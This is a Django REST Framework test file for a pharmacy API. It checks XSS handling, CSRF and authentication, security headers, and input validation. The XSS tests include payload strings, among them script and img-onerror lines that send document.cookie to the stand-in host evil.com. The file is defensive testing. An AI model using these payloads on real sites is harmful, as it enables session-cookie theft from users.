"""
XSS (Cross-Site Scripting) and CSRF Security Tests
"""

from django.conf import settings
from django.contrib.auth import get_user_model
from django.test import TestCase, override_settings
from rest_framework import status
from rest_framework.test import APIClient

User = get_user_model()


class XSSAttackTests(TestCase):
    """Test XSS attack vectors"""

    def setUp(self):
        self.client = APIClient()
        self.user = User.objects.create_user(
            email="testuser@test.com", password="testpass123", phone_number="+998901234567"
        )
        from pharmacy.models.medicine import Category

        self.category = Category.objects.create(name="Test Category", slug="test-category")

    def test_xss_in_profile_name(self):
        """Test XSS in user profile name field"""
        self.client.force_authenticate(user=self.user)

        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<body onload=alert('XSS')>",
        ]

        for payload in xss_payloads:
            response = self.client.patch("/api/v1/users/profile/", {"full_name": payload})

            # Django should escape or sanitize the input
            # Should not return 200 OK with unescaped content
            self.assertIn(
                response.status_code, [status.HTTP_200_OK, status.HTTP_201_CREATED, status.HTTP_400_BAD_REQUEST]
            )

    def test_xss_in_review_content(self):
        """Test XSS in review content"""
        from pharmacy.models.medicine import Medicine

        medicine = Medicine.objects.create(
            name="Test Medicine", slug="test-medicine", price=100.00, stock=10, category=self.category
        )

        xss_payloads = [
            "<script>document.location='http://evil.com?c='+document.cookie</script>",
            "<img src=x onerror='fetch(\"http://evil.com?data=\"+document.cookie)'>",
        ]

        for payload in xss_payloads:
            response = self.client.post(
                "/api/v1/products/reviews/", {"medicine": medicine.id, "rating": 5, "content": payload}
            )

            # Should handle gracefully
            self.assertIn(
                response.status_code,
                [status.HTTP_201_CREATED, status.HTTP_400_BAD_REQUEST, status.HTTP_401_UNAUTHORIZED],
            )

    def test_xss_in_contact_message(self):
        """Test XSS in contact form"""
        xss_payloads = [
            "<script>stealCookies()</script>",
            "<iframe src='http://evil.com'></iframe>",
        ]

        for payload in xss_payloads:
            response = self.client.post(
                "/api/v1/products/contact/", {"name": "Test User", "email": "test@test.com", "message": payload}
            )

            # Should handle gracefully
            self.assertIn(response.status_code, [status.HTTP_201_CREATED, status.HTTP_400_BAD_REQUEST])


class CSRFProtectionTests(TestCase):
    """Test CSRF protection"""

    def setUp(self):
        self.client = APIClient()
        self.user = User.objects.create_user(
            email="testuser@test.com", password="testpass123", phone_number="+998901234567"
        )

    def test_csrf_protection_enabled(self):
        """Test that CSRF protection is enabled"""
        from django.middleware.csrf import CsrfViewMiddleware

        # Check that middleware is configured
        middleware_enabled = any("CsrfViewMiddleware" in m for m in settings.MIDDLEWARE)
        self.assertTrue(middleware_enabled, "CSRF middleware should be enabled")

    def test_csrf_token_required_for_mutations(self):
        """Test that CSRF token is required for state-changing requests"""
        # Django REST Framework handles this differently than regular Django
        # For DRF, we test that authentication is required

        self.client.force_authenticate(user=self.user)

        # Create order without CSRF (DRF handles this via auth)
        response = self.client.post(
            "/api/v1/orders/orders/",
            {"total_price": 100.00, "address": "Test address", "phone_number": "+998901234567"},
        )

        # Should fail because required fields missing, not CSRF
        self.assertEqual(response.status_code, status.HTTP_400_BAD_REQUEST)

    def test_post_without_auth_fails(self):
        """Test that POST without authentication fails"""
        response = self.client.post(
            "/api/v1/orders/orders/",
            {"total_price": 100.00, "address": "Test address", "phone_number": "+998901234567"},
        )

        # Should require authentication
        self.assertEqual(response.status_code, status.HTTP_401_UNAUTHORIZED)

    def test_put_without_auth_fails(self):
        """Test that PUT without authentication fails"""
        response = self.client.put("/api/v1/users/profile/")

        self.assertEqual(response.status_code, status.HTTP_401_UNAUTHORIZED)


class SecurityHeadersTests(TestCase):
    """Test security headers"""

    def test_security_headers_configured(self):
        """Test that security headers are configured"""
        # Django SecurityMiddleware should add headers
        headers_configured = any("SecurityMiddleware" in m for m in settings.MIDDLEWARE)
        self.assertTrue(headers_configured, "SecurityMiddleware should be enabled")

    def test_content_security_policy(self):
        """Test CSP configuration"""
        # CSP should be configured
        csp_configured = hasattr(settings, "CONTENT_SECURITY_POLICY")
        self.assertTrue(csp_configured, "Content-Security-Policy should be configured")

    def test_x_frame_options(self):
        """Test X-Frame-Options header"""
        from django.middleware.clickjacking import XFrameOptionsMiddleware

        xframe_enabled = any("XFrameOptionsMiddleware" in m for m in settings.MIDDLEWARE)
        self.assertTrue(xframe_enabled, "X-Frame-Options middleware should be enabled")


class InputValidationTests(TestCase):
    """Test input validation"""

    def setUp(self):
        self.client = APIClient()

    def test_email_validation(self):
        """Test email validation"""
        response = self.client.post(
            "/api/v1/users/register/",
            {"email": "not-an-email", "password": "testpass123", "phone_number": "+998901234567"},
        )

        self.assertEqual(response.status_code, status.HTTP_400_BAD_REQUEST)

    def test_password_validation(self):
        """Test password validation"""
        response = self.client.post(
            "/api/v1/users/register/",
            {"email": "test@test.com", "password": "123", "phone_number": "+998901234567"},  # Too short
        )

        self.assertEqual(response.status_code, status.HTTP_400_BAD_REQUEST)

    def test_phone_validation(self):
        """Test phone number validation"""
        response = self.client.post(
            "/api/v1/users/register/",
            {"email": "test@test.com", "password": "testpass123", "phone_number": "not-a-phone"},
        )

        self.assertEqual(response.status_code, status.HTTP_400_BAD_REQUEST)
